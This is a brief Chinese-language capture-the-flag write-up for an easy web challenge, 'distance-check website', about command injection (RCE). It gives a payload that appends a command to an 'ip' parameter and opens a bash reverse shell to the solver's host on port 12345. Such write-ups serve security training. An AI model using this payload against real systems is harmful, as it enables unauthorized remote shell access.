### 1.题目名称

distance-check website



### 2.题目类型

web(easy)


### 3.考察知识点

RCE


### 4.解题思路

从bp抓取的数据包猜测可能存在任意代码执行漏洞，但是直接攻击没有回显，我们使用如下payload：

ip=127.0.0.1;bash -c "bash -i >& /dev/tcp/your\_ip\_here/12345 0>&1"







